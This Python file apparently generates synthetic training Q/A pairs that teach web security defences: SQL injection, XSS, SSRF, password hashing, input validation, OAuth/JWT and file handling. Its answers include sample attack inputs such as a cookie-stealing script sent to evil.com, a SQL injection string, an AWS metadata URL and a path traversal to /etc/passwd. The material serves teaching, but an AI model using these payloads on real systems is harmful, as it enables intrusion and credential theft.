"""Phase 4A: Self-Improvement — Training Data Generation (Part 7)

Generate Q/A training pairs for security topics: OWASP top 10, secure
password handling, input validation, API authentication, and secure file handling.
"""

PAIRS = [
    (
        "thinking/auto-datagen-owasp-top-10",
        r'''Generate 3 high-quality training pairs that teach the OWASP Top 10 web application security risks. For each pair, explain why it's effective training data.''',
        r'''<think>
The OWASP Top 10 is the industry-standard awareness document for web security. Good training data should cover the most impactful categories (injection, broken auth, XSS) with concrete exploit examples and mitigations. I need to avoid generic "be careful" advice and instead show specific code-level fixes. The progression should go from understanding individual vulnerabilities to recognizing patterns and building secure-by-default architectures.
</think>

Here are 3 training pairs for the OWASP Top 10:

**Pair 1 (Beginner):**
```
Q: What is SQL injection, and how do you prevent it?
A: SQL injection occurs when user input is concatenated directly into a SQL query, allowing an attacker to modify the query's logic. For example, a login form that builds the query "SELECT * FROM users WHERE username='" + input + "'" is vulnerable: entering ' OR '1'='1 bypasses authentication by making the WHERE clause always true. Prevention: always use parameterized queries (prepared statements). In Python with psycopg2: cursor.execute("SELECT * FROM users WHERE username = %s", (username,)). The database driver treats the parameter as data, never as SQL code. Additionally, use an ORM like SQLAlchemy or Django ORM, which parameterizes by default. As defense in depth, apply least-privilege database permissions so even a successful injection cannot DROP tables or access other schemas.
```
**Why this works:** Shows the exact exploit mechanism with a real payload, provides language-specific prevention code, and layers defenses (parameterization + ORM + permissions) — teaching depth rather than a single fix.

**Pair 2 (Intermediate):**
```
Q: What is Cross-Site Scripting (XSS), and what are the differences between stored, reflected, and DOM-based XSS?
A: XSS allows an attacker to inject malicious JavaScript into pages viewed by other users. Stored XSS: the payload is saved in the database (e.g., a forum post containing <script>document.location='https://evil.com/steal?c='+document.cookie</script>) and executes for every visitor. Reflected XSS: the payload is in a URL parameter that the server echoes back without escaping (e.g., a search page displaying "Results for <script>...</script>"). DOM-based XSS: the payload is processed entirely client-side by JavaScript that reads from location.hash or innerHTML without sanitization. Prevention for all types: (1) escape output contextually — HTML-encode for HTML content, JavaScript-encode for script contexts, URL-encode for URLs; (2) use Content-Security-Policy headers to block inline scripts; (3) use frameworks like React or Angular that auto-escape by default; (4) sanitize HTML input with a library like DOMPurify if rich text is required. Never rely solely on input filtering — output encoding is the primary defense.
```
**Why this works:** Distinguishes three XSS subtypes with specific exploit examples, provides four layered defenses, and emphasizes output encoding over input filtering — correcting a common misconception.

**Pair 3 (Advanced):**
```
Q: How do you protect a web application against Server-Side Request Forgery (SSRF), and why is it especially dangerous in cloud environments?
A: SSRF occurs when an attacker tricks the server into making HTTP requests to unintended destinations. For example, if an application fetches a URL provided by the user (e.g., for generating link previews), an attacker can supply http://169.254.169.254/latest/meta-data/ to access the AWS instance metadata service, potentially retrieving IAM credentials. Defenses include: (1) allowlist permitted domains and protocols — reject anything not explicitly allowed; (2) resolve DNS before validation and block private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16) to prevent DNS rebinding attacks; (3) use IMDSv2 on AWS, which requires a PUT request with a TTL token, making metadata theft via simple GET-based SSRF impossible; (4) run URL-fetching workloads in isolated network segments with no access to internal services; (5) disable unnecessary URL schemes (file://, gopher://, dict://). SSRF is ranked in the OWASP Top 10 because cloud metadata endpoints turn a seemingly low-impact request-forwarding bug into full account compromise.
```
**Why this works:** Demonstrates the cloud metadata attack vector that makes SSRF critical in modern infrastructure, provides five specific defenses including IMDSv2 and DNS rebinding prevention, and explains why the severity is amplified in cloud environments.

**Quality checklist:**
- Each teaches one concept
- Questions are realistic
- Answers show reasoning
- Difficulty progression is clear'''
    ),
    (
        "thinking/auto-datagen-secure-password-handling",
        r'''Generate 3 high-quality training pairs that teach secure password handling and storage. For each pair, explain why it's effective training data.''',
        r'''<think>
Password security is one of the most commonly misunderstood areas. Many developers still use fast hashes like SHA-256 or store passwords in reversible ways. Training data needs to clearly explain why slow hashing algorithms are necessary, cover salt usage, and address modern alternatives like passkeys. The progression should go from basic hashing to bcrypt/argon2 configuration to passwordless authentication.
</think>

Here are 3 training pairs for secure password handling:

**Pair 1 (Beginner):**
```
Q: Why should passwords be hashed and not encrypted, and what is salting?
A: Encryption is reversible — anyone with the key can recover the original password. If the key is compromised, every password is exposed. Hashing is one-way: you cannot recover the password from its hash. To verify a login, you hash the submitted password and compare it to the stored hash. Salting means prepending a unique random value to each password before hashing. Without salts, two users with the password "hunter2" produce identical hashes, and attackers can use precomputed rainbow tables to crack them. With a unique 16-byte salt per user, even identical passwords produce different hashes, and rainbow tables become useless. Store the salt alongside the hash in the database — it is not secret, just unique. Modern hashing functions like bcrypt embed the salt automatically in their output string.
```
**Why this works:** Directly contrasts encryption vs. hashing (a common confusion), explains salts with a concrete example, and reassures that salts are not secrets — removing a frequent source of developer anxiety.

**Pair 2 (Intermediate):**
```
Q: Why is bcrypt preferred over SHA-256 for password hashing, and how do you configure its cost factor?
A: SHA-256 is designed to be fast — a modern GPU can compute billions of SHA-256 hashes per second, making brute-force attacks trivial. Bcrypt is intentionally slow: it includes a configurable cost factor (work factor) that controls the number of iterations. Each increment doubles the computation time. A cost factor of 12 takes roughly 250ms per hash on current hardware, which is imperceptible during login but limits an attacker to about 4 hashes per second per core. In Python: import bcrypt; hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12)). Choose the cost factor so that hashing takes 200-400ms on your production hardware. Re-evaluate every 2-3 years as hardware improves and increase the factor. Argon2id is the newer recommendation (winner of the Password Hashing Competition) because it is also memory-hard, resisting GPU and ASIC attacks. Use argon2-cffi in Python with default parameters as a starting point.
```
**Why this works:** Quantifies the speed difference between SHA-256 and bcrypt, provides exact code, gives a practical tuning rule (200-400ms), and introduces Argon2id as the modern successor — preparing the learner for current best practice.

**Pair 3 (Advanced):**
```
Q: How do you implement a secure password reset flow, and what are common vulnerabilities in reset mechanisms?
A: A secure reset flow: (1) User submits their email. Always respond with "If an account exists, we sent a reset link" to prevent email enumeration. (2) Generate a cryptographically random token (secrets.token_urlsafe(32) in Python), hash it with SHA-256, and store the hash in the database with an expiry (e.g., 1 hour). (3) Send the unhashed token in a one-time-use HTTPS link. (4) When the user clicks the link, hash the received token, compare to the stored hash, verify expiry, then allow password change. (5) Invalidate the token immediately after use and invalidate all existing sessions. Common vulnerabilities: storing the raw token (database leak exposes all pending resets), not expiring tokens (attacker with old email access can reset anytime), not invalidating sessions (attacker retains access even after password change), and predictable tokens (using timestamp or sequential IDs instead of cryptographic randomness). Rate-limit reset requests per email to prevent abuse.
```
**Why this works:** Provides a complete step-by-step implementation, explains why each step matters, explicitly lists four common mistakes, and includes the often-forgotten session invalidation step — covering the full attack surface of reset flows.

**Quality checklist:**
- Each teaches one concept
- Questions are realistic
- Answers show reasoning
- Difficulty progression is clear'''
    ),
    (
        "thinking/auto-datagen-input-validation",
        r'''Generate 3 high-quality training pairs that teach input validation best practices. For each pair, explain why it's effective training data.''',
        r'''<think>
Input validation is the first line of defense against many attack categories. Training data should emphasize validation at multiple layers (client, server, database), cover both syntactic and semantic validation, and address common bypasses. I should include examples in real frameworks and distinguish between validation (rejecting bad input) and sanitization (transforming input to be safe).
</think>

Here are 3 training pairs for input validation:

**Pair 1 (Beginner):**
```
Q: What is input validation, and why must it happen on the server side even if you validate on the client?
A: Input validation checks that user-provided data meets expected constraints before processing it — for example, an email field contains a valid email format, an age field contains a number between 0 and 150, and a username contains only alphanumeric characters. Client-side validation (JavaScript in the browser) improves user experience by catching mistakes early, but it provides zero security. An attacker can bypass it trivially using browser dev tools, curl, or a proxy like Burp Suite. Server-side validation is mandatory because the server is the trust boundary — it is the only code you control. In practice, validate on both sides: client for UX, server for security. In Flask: if not re.match(r'^[a-zA-Z0-9_]{3,20}$', username): abort(400). In Django, use form validators or serializer fields that enforce constraints automatically.
```
**Why this works:** Explains why client-side validation is insufficient with specific bypass tools, provides a regex example and framework-specific approaches, and introduces the trust boundary concept — foundational for security thinking.

**Pair 2 (Intermediate):**
```
Q: What is the difference between allowlisting and blocklisting for input validation, and which is more secure?
A: Blocklisting (denylisting) rejects known-bad patterns — e.g., rejecting inputs containing <script> or DROP TABLE. Allowlisting (allowlisting) accepts only known-good patterns — e.g., a phone number field accepts only digits, spaces, hyphens, and plus signs. Allowlisting is far more secure because it is impossible to enumerate every malicious input. Attackers constantly find new encodings, bypasses, and edge cases that slip past blocklists. For example, a blocklist rejecting <script> is bypassed by <SCRIPT>, <scr<script>ipt>, or %3Cscript%3E. An allowlist that accepts only [a-zA-Z0-9 ] blocks all of these without needing to know about them. Apply allowlisting wherever possible: restrict character sets, enforce length limits, validate against known formats (email, UUID, ISO date). Use blocklisting only as a supplementary defense or when the valid input space is too broad to define (e.g., free-text comments, where you must sanitize output instead).
```
**Why this works:** Shows concrete bypass examples that defeat blocklists, gives a clear recommendation with reasoning, and acknowledges the practical case where blocklisting is necessary — teaching principled flexibility rather than rigid rules.

**Pair 3 (Advanced):**
```
Q: How do you validate complex nested JSON input in an API, and what risks does insufficient validation create?
A: Use a schema validation library to declaratively define expected structure, types, and constraints. In Python, Pydantic is the standard: define a model class with typed fields, optional constraints (min_length, regex, gt/lt), and nested models. Pydantic rejects any input that does not conform, returning detailed errors. Example risks of insufficient validation: (1) Type confusion — an API expecting {"price": 10.99} receives {"price": "free"}, causing a crash or logic error downstream. (2) Mass assignment — extra fields like {"role": "admin"} are accepted and saved to the database if the API blindly unpacks input into a model. (3) Oversized payloads — a deeply nested JSON (1000 levels deep) or a 100MB body causes denial of service. (4) Injection via nested fields — a nested object containing SQL or NoSQL operators (e.g., {"$gt": ""} in MongoDB) manipulates queries. Mitigations: enforce strict schemas with Pydantic or JSON Schema, set max request body size in your web server, explicitly list accepted fields (never use **kwargs from user input), and validate business rules (e.g., quantity > 0) in addition to structural rules.
```
**Why this works:** Addresses modern API development with Pydantic (the dominant Python tool), enumerates four specific risk categories with exploit examples, and separates structural validation from business rule validation — a distinction many developers miss.

**Quality checklist:**
- Each teaches one concept
- Questions are realistic
- Answers show reasoning
- Difficulty progression is clear'''
    ),
    (
        "thinking/auto-datagen-api-authentication",
        r'''Generate 3 high-quality training pairs that teach API authentication mechanisms. For each pair, explain why it's effective training data.''',
        r'''<think>
API authentication is critical for every web service. Training data should cover API keys, OAuth 2.0, and JWTs — the three most common mechanisms — and explain when each is appropriate. I need to address token storage, expiration, and common mistakes like putting secrets in URLs or using symmetric JWTs when asymmetric is needed.
</think>

Here are 3 training pairs for API authentication:

**Pair 1 (Beginner):**
```
Q: What are API keys, and what are their limitations for authentication?
A: An API key is a unique string assigned to a client application, sent with each request (typically via an Authorization header or query parameter). The server looks up the key to identify the caller and enforce rate limits or access controls. API keys are simple to implement but have limitations: (1) they authenticate applications, not users — you know which app is calling, but not which user within that app; (2) they are long-lived secrets that are hard to rotate without downtime; (3) if sent in URLs (query parameters), they are logged in server access logs, browser history, and proxy logs, leading to leakage; (4) they lack scoping — a key either works or it does not, with no fine-grained permissions. Use API keys for server-to-server calls where simplicity matters and the key can be stored securely in environment variables. Never use them as the sole authentication for user-facing APIs — use OAuth 2.0 or JWTs instead.
```
**Why this works:** Explains the mechanism clearly, lists four specific limitations, warns against URL transmission, and gives a clear use-case boundary — helping the learner know when API keys are and are not appropriate.

**Pair 2 (Intermediate):**
```
Q: How does OAuth 2.0 authorization code flow work, and why is PKCE required for public clients?
A: The authorization code flow: (1) The client redirects the user to the authorization server's /authorize endpoint with a client_id, redirect_uri, and requested scopes. (2) The user logs in and consents. (3) The authorization server redirects back to the client's redirect_uri with a short-lived authorization code. (4) The client exchanges the code for an access token by calling the /token endpoint with the code plus its client_secret. (5) The client uses the access token to call protected APIs. For public clients (SPAs, mobile apps), there is no client_secret to protect. Without PKCE (Proof Key for Code Exchange), an attacker who intercepts the authorization code (via a malicious app registered to the same redirect URI scheme on mobile) can exchange it for a token. PKCE prevents this: the client generates a random code_verifier, sends its SHA-256 hash (code_challenge) in step 1, and sends the original code_verifier in step 4. The server verifies that the hash matches, ensuring only the client that initiated the flow can complete it.
```
**Why this works:** Walks through the complete flow step by step, explains the specific attack PKCE prevents with a realistic mobile scenario, and makes the cryptographic mechanism (challenge/verifier) concrete and understandable.

**Pair 3 (Advanced):**
```
Q: What are the security considerations for using JWTs as API access tokens, and when should you use opaque tokens instead?
A: JWTs encode claims (user ID, roles, expiry) in a signed token that the API can verify without calling the auth server — reducing latency and eliminating a single point of failure. Security considerations: (1) Always validate the signature algorithm — accept only your expected algorithm (e.g., RS256). The "alg: none" attack tricks servers into accepting unsigned tokens. (2) Validate exp, iss, and aud claims to prevent expired or misrouted tokens. (3) JWTs cannot be revoked individually; if a token is stolen, it remains valid until expiry. Mitigation: use short expiry (15 minutes) with refresh tokens. (4) Do not store sensitive data in the payload — JWTs are base64-encoded, not encrypted. Anyone can read the claims. (5) Use asymmetric signing (RS256/ES256) so that services can verify tokens with the public key without access to the signing secret. Use opaque tokens instead of JWTs when: you need immediate revocation (e.g., financial APIs), the token payload would be too large, or you want to avoid exposing claims to the client. Opaque tokens require a token introspection endpoint, trading network calls for revocation capability.
```
**Why this works:** Covers five specific JWT security pitfalls with named attacks (alg:none), provides concrete mitigation (15-minute expiry + refresh tokens), and gives a clear decision framework for JWT vs. opaque tokens — teaching architectural reasoning alongside security knowledge.

**Quality checklist:**
- Each teaches one concept
- Questions are realistic
- Answers show reasoning
- Difficulty progression is clear'''
    ),
    (
        "thinking/auto-datagen-secure-file-handling",
        r'''Generate 3 high-quality training pairs that teach secure file handling in web applications. For each pair, explain why it's effective training data.''',
        r'''<think>
File handling is an underappreciated attack surface. Uploads, downloads, and path manipulation all have security implications. Training data should cover path traversal, unrestricted file upload, and secure temporary file handling. Concrete examples with real vulnerabilities and mitigations will be most valuable.
</think>

Here are 3 training pairs for secure file handling:

**Pair 1 (Beginner):**
```
Q: What is a path traversal attack, and how do you prevent it when serving files?
A: Path traversal (directory traversal) occurs when an attacker manipulates a file path to access files outside the intended directory. If an application serves files based on user input — e.g., GET /download?file=report.pdf — an attacker can request /download?file=../../../etc/passwd to read system files. Prevention: (1) never construct file paths by concatenating user input directly. (2) Use os.path.basename() to strip directory components: filename = os.path.basename(user_input). (3) Resolve the full path and verify it starts with the allowed base directory: full_path = os.path.realpath(os.path.join(BASE_DIR, filename)); assert full_path.startswith(os.path.realpath(BASE_DIR)). (4) Use a whitelist of allowed filenames if possible. (5) On Linux, consider chroot or containerization to limit filesystem access even if traversal succeeds. Never trust user-supplied filenames — always validate against the expected directory.
```
**Why this works:** Shows the exact attack payload, provides three layers of defense with Python code, and mentions defense-in-depth with chroot — teaching that no single check is sufficient.

**Pair 2 (Intermediate):**
```
Q: What security risks do file uploads introduce, and how do you safely handle uploaded files?
A: Unrestricted file uploads can lead to remote code execution, storage exhaustion, and malware distribution. Risks and mitigations: (1) Executable upload — an attacker uploads a .php or .py file and navigates to it, executing code on the server. Mitigation: store uploads outside the web root, serve them through a handler that sets Content-Disposition: attachment, and never execute uploaded files. (2) Content-type spoofing — a file named image.png is actually an HTML file containing JavaScript. Mitigation: validate the file's magic bytes (use python-magic), not just the extension. (3) Oversized files — a 10GB upload exhausts disk space. Mitigation: enforce max file size at the web server level (e.g., Nginx client_max_body_size 10m) and in application code. (4) Filename injection — a filename like ../../etc/cron.d/malicious overwrites system files. Mitigation: generate a random UUID filename and store the original name in the database. (5) Scan uploads with ClamAV or a similar antivirus tool before making them accessible to other users.
```
**Why this works:** Enumerates five distinct upload risks with specific attack scenarios, provides concrete mitigation for each, and includes practical tools (python-magic, ClamAV, Nginx config) — giving the learner a complete upload security checklist.

**Pair 3 (Advanced):**
```
Q: How do you securely handle temporary files in a multi-process web application, and what are the risks of insecure temp file creation?
A: Insecure temporary file handling can lead to symlink attacks, race conditions, and information disclosure. In a symlink attack, an attacker creates a symbolic link at the predicted temp file path pointing to a sensitive file (e.g., /etc/shadow). When the application writes to the temp file, it overwrites the target. Race conditions occur between checking if a file exists and creating it (TOCTOU — time of check to time of use). Secure practices: (1) Use tempfile.mkstemp() or tempfile.NamedTemporaryFile() in Python — they create files with O_EXCL (exclusive creation) and restrictive permissions (0600), preventing both symlink and TOCTOU attacks. (2) Use the tempfile.TemporaryDirectory() context manager for directories, which handles cleanup automatically. (3) Never use predictable filenames like /tmp/myapp_output.txt. (4) Set the temp directory to an application-specific location with restricted permissions: tempfile.tempdir = '/var/myapp/tmp'. (5) Always clean up temp files in a finally block or use context managers. (6) In containerized environments, mount /tmp as a tmpfs with a size limit and noexec flag to prevent execution of uploaded content stored temporarily.
```
**Why this works:** Explains the symlink and TOCTOU attacks that most developers are unaware of, provides specific Python API calls with their security properties, and covers container hardening — connecting application-level and infrastructure-level security.

**Quality checklist:**
- Each teaches one concept
- Questions are realistic
- Answers show reasoning
- Difficulty progression is clear'''
    ),
]

if __name__ == "__main__":
    for tag, q, a in PAIRS:
        print(f"  [{tag}] {q[:60]}...")
    print(f"\nTotal pairs in this file: {len(PAIRS)}")
